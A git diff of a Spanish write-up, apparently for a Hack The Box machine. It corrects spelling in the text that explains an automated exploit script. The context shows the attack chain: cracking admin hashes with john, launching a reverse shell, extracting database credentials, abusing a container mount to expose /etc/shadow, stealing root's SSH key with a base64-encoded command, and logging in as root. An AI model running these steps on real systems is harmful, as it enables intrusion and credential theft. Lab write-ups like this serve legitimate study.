@@ -126,8 +126,7 @@ def Update_name(old_name,new_name):
 
 	r = s.post(url_update, data=json.dumps(data_post),headers=headers, verify=False)
 ```
-Luego para acceder al subdominio **dev** se ejecuto la función **Key_Gen** el cual genera la clave necesaria para luego enviarla, y así acceder al subdominio.
-
+Luego para acceder al subdominio **dev** se ejecutó la función **Key_Gen** el cual genera la clave necesaria para luego enviarla, y así acceder al subdominio.
 
 ```python
 def calc_g3():
@@ -194,7 +193,7 @@ def try_keys(keys):
 		cont += 1
 ```
 
-Seguido de esto, con la función **GetPassAdmin** acceede al subdominio utilizando de nuevo el **session** para que la sesión no cambie, y así envia una petición por GET para crear un puntuación y así poder acceder al marcado y obtener el **hash** del usuario **admin**, con la cual mediante la función **crack_hash** meterla en un archivo, y ejecutando la herramienta **john** realiza el crackeo del hash para obtener la contraseña y guardarla en la variable **pass_admin**.
+Seguido de esto, con la función **GetPassAdmin** accede al subdominio utilizando de nuevo el **session** para que la sesión no cambie, y así envía una petición por GET para crear una puntuación y así poder acceder al marcado y obtener el **hash** del usuario **admin**, con la cual mediante la función **crack_hash** meterla en un archivo, y ejecutando la herramienta **john** rompe del hash para obtener la contraseña y guardarla en la variable **pass_admin**.
 
 ```python
 pass_admin = GetPassAdmin()
@@ -240,7 +239,7 @@ def crack_hash(hash):
 	return Pass.replace('\n','')
 ```
 
-Con la contraseña ya obtenida, accede al panel de login del usuario admin con la funcón **Login_admin**, para guardar la sesión y con la función **SendShell** la cual esta jugando con la libreria **multiprocessing** para utilizar hilos y envía la ReverseShell estando en escucha en la función **Get_Shell**. 
+Con la contraseña ya obtenida, accede al panel de login del usuario admin con la función **Login_admin**, para guardar la sesión y con la función **SendShell** la cual está jugando con la librería **multiprocessing** para utilizar hilos y envía la ReverseShell estando en escucha en la función **Get_Shell**.
 
 ```python
 Login_admin(pass_admin)
@@ -273,7 +272,7 @@ def Send_Shell():
 	r = s.post(url_hash, data=data_post)
 ```
 
-En la función **Get_Shell** tras recibir la ReverseShell envía el contenido del archivo que contiene la contraseña del usuario **dew** usando **recv** para recibir los datos en fragmentos con los cuales luego crear un archivo que contendra esos datos.
+En la función **Get_Shell** tras recibir la ReverseShell envía el contenido del archivo que contiene la contraseña del usuario **dew** usando **recv** para recibir los datos en fragmentos con los cuales luego crear un archivo que contendrá esos datos.
 
 ```python
 Get_Shell()
@@ -302,7 +301,7 @@ def Get_Shell():
 			f.write(datos_recibidos)
 ```
 
-Con el archivo ya creado, en la función **Get_Credentials** utilizando la libreria **re** obtiene mediante expresiónes regulares el nombre de usuario y la contraseña guardandolas en las variables **User_drew** y **Pass_drew**.
+Con el archivo ya creado, en la función **Get_Credentials** utilizando la librería **re** obtiene mediante expresiónes regulares el nombre de usuario y la contraseña guardándolas en las variables **User_drew** y **Pass_drew**.
 
 
 ```python
@@ -320,7 +319,7 @@ def Get_Credentials():
 	return	re.findall(r'\"MYSQL_USER=(.*?)\"', check_db)[0],re.findall(r'\"MYSQL_ROOT_PASSWORD=(.*?)\"', check_db)[0]
 ```
 
-Teniendo ya las credenciales,accede via SSH como el usuario **drew** y realiza un bucle a la montura del contenedor, el cual crea un archivo que le da permisos de ejecución al **/etc/shadow**.
+Teniendo ya las credenciales, accede vía SSH como el usuario **drew** y realiza un bucle a la montura del contenedor, el cual crea un archivo que le da permisos de ejecución al **/etc/shadow**.
 
 ```python
 multiprocessing.Process(args=(User_drew,Pass_drew,),target=Drew).start()
@@ -358,7 +357,7 @@ def Game_Tester2(username,password):
 
 ```
 
-Con el contenedor ya reiniciado, en la función **Get_Hash_Adm** obtiene el hash del usuario **game-adm** accediendo al **/etc/shadow/** y guardandola en un archivo, para luego rompearla con la herramienta **john**.
+Con el contenedor ya reiniciado, en la función **Get_Hash_Adm** obtiene el hash del usuario **game-adm** accediendo al **/etc/shadow/** y guardándola en un archivo, para luego romperla con la herramienta **john**.
 
 ```python
 def Get_Hash_Adm(username,password):
@@ -381,7 +380,7 @@ def Get_Hash_Adm(username,password):
 os.system("john -w=/usr/share/wordlists/rockyou.txt hash_adm > pass 2>/dev/null; cat pass | grep \"(?)\" | cut -d' ' -f1 | sponge pass")
 ```
 
-Finalmente en la función **GetID_RSA** obtiene la clave privada el usuario **root**, pero para evitar problemas se codificó la obtención del id_rsa en base64 para luego ejecutarla.
+Finalmente, en la función **GetID_RSA** obtiene la clave privada el usuario **root**, pero para evitar problemas se codificó la obtención del id_rsa en base64 para luego ejecutarla.
 
 ```python
 GetID_RSA(User_drew, Pass_drew, "game-adm", Pass_Adm)
@@ -404,9 +403,8 @@ def GetID_RSA(username,password, username_adm, password_adm):
             f.write(id_rsa)
 ```
 
-Y asi con la clave ya obtenida, utilizando la función **GetRoot_Shell** accede como el usuario **root**.
-
-```
+Y así con la clave ya obtenida, utilizando la función **GetRoot_Shell** accede como el usuario **root**.
+```python
 def GetRoot_Shell():
 	ssh_command = "ssh -i id_rsa root@10.10.11.110"
 
